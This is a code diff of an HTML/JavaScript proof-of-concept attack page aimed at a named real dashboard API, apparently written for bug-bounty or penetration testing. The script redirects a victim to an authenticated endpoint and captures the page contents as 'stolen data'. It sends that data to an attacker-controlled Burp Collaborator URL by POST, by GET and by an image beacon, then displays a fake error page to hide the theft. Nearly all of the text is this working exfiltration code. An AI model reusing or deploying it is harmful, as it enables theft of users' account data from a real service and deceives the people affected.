@@ -20,58 +20,100 @@
                 return;
             }
             
-            // Store collaborator URL in sessionStorage so the API page can access it
-            sessionStorage.setItem('collabURL', COLLAB);
+            // Store collaborator URL in localStorage (more reliable than sessionStorage)
+            localStorage.setItem('collabURL', COLLAB);
+            localStorage.setItem('attackTime', Date.now());
+            
+            alert('Redirecting to API...\n\nYou will see the stolen data in the next alert.');
             
             // Redirect to API (this sends cookies because it's top-level navigation)
-            window.location.href = 'https://dashboard.route.com/api/mn/v1/stores';
+            setTimeout(function() {
+                window.location.href = 'https://dashboard.route.com/api/mn/v1/stores';
+            }, 1000);
         }
 
-        // ===== AUTO-CAPTURE WHEN ON API PAGE =====
-        if (window.location.hostname === 'dashboard.route.com' && 
-            window.location.pathname.includes('/api/')) {
+        // ===== EXECUTE IMMEDIATELY WHEN PAGE LOADS =====
+        (function() {
+            // Check if we're on the API endpoint
+            var isAPIPage = window.location.hostname === 'dashboard.route.com' && 
+                           window.location.pathname.includes('/api/');
             
-            // Get the stolen data
+            if (!isAPIPage) {
+                return; // Not on API page, exit
+            }
+
+            // We're on the API page!
+            console.log('On API page, executing capture...');
+            
+            // Get collaborator URL
+            var collabURL = localStorage.getItem('collabURL');
+            var attackTime = localStorage.getItem('attackTime');
+            
+            // Check if attack was recent (within last 30 seconds)
+            var isRecentAttack = attackTime && (Date.now() - parseInt(attackTime)) < 30000;
+            
+            if (!collabURL || !isRecentAttack) {
+                console.log('No recent attack found');
+                return;
+            }
+            
+            // Get the stolen data from the page
             var stolenData = document.body.innerText || document.body.textContent;
             
-            // Get collaborator URL from sessionStorage
-            var collabURL = sessionStorage.getItem('collabURL');
+            console.log('Captured data, length:', stolenData.length);
             
-            if (!collabURL) {
-                alert('ERROR: No collaborator URL found. Please restart the attack.');
-            } else {
-                // ALERT 1: Show stolen data
-                alert('STOLEN DATA:\n\n' + stolenData);
+            // ALERT 1: Show stolen data
+            alert('STOLEN DATA:\n\n' + stolenData.substring(0, 500) + '\n\n... (truncated)');
+            
+            // Send to collaborator using multiple methods
+            console.log('Sending to collaborator:', collabURL);
+            
+            // Method 1: POST request
+            fetch(collabURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'text/plain'},
+                body: stolenData
+            }).then(function() {
+                console.log('POST sent successfully');
+            }).catch(function(e) {
+                console.log('POST failed:', e);
+            });
+            
+            // Method 2: GET request with data in URL
+            fetch(collabURL + '?data=' + encodeURIComponent(stolenData), {
+                method: 'GET',
+                mode: 'no-cors'
+            }).then(function() {
+                console.log('GET sent successfully');
+            }).catch(function(e) {
+                console.log('GET failed:', e);
+            });
+            
+            // Method 3: Image beacon (most reliable)
+            var img = new Image();
+            img.onload = function() { console.log('Image beacon sent'); };
+            img.onerror = function() { console.log('Image beacon failed'); };
+            img.src = collabURL + '/img?d=' + encodeURIComponent(stolenData.substring(0, 1000));
+            
+            // ALERT 2: Confirm sent
+            setTimeout(function() {
+                alert('SUCCESS!\n\nData sent to:\n' + collabURL + '\n\nCheck your Burp Collaborator now!');
                 
-                // Send to collaborator
-                // Method 1: POST
-                fetch(collabURL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: stolenData
-                }).catch(e => console.log('POST failed:', e));
+                // Clean up localStorage
+                localStorage.removeItem('collabURL');
+                localStorage.removeItem('attackTime');
                 
-                // Method 2: GET
-                fetch(collabURL + '?data=' + encodeURIComponent(stolenData), {
-                    mode: 'no-cors'
-                }).catch(e => console.log('GET failed:', e));
-                
-                // Method 3: Image
-                var img = new Image();
-                img.src = collabURL + '/img?d=' + encodeURIComponent(stolenData.substring(0, 1000));
-                
-                // ALERT 2: Confirm sent
+                // Show fake error page
                 setTimeout(function() {
-                    alert('Data sent to: ' + collabURL + '\n\nCheck your collaborator now!');
-                    
-                    // Clear sessionStorage
-                    sessionStorage.removeItem('collabURL');
-                    
-                    // Show fake error
-                    document.body.innerHTML = '<div style="padding:100px;text-align:center;"><h1>Error</h1><p>Verification failed. Please try again later.</p><a href="https://route.com">Return to Route.com</a></div>';
+                    document.body.innerHTML = '<div style="font-family:Arial;padding:100px;text-align:center;">' +
+                        '<h1 style="color:#d32f2f;">⚠️ Error</h1>' +
+                        '<p style="color:#666;font-size:18px;">Verification failed. Please try again later.</p>' +
+                        '<a href="https://route.com" style="display:inline-block;margin-top:30px;padding:12px 24px;background:#0052FF;color:white;text-decoration:none;border-radius:6px;">Return to Route.com</a>' +
+                        '</div>';
                 }, 500);
-            }
-        }
+            }, 500);
+        })();
     </script>
 </body>
 </html>
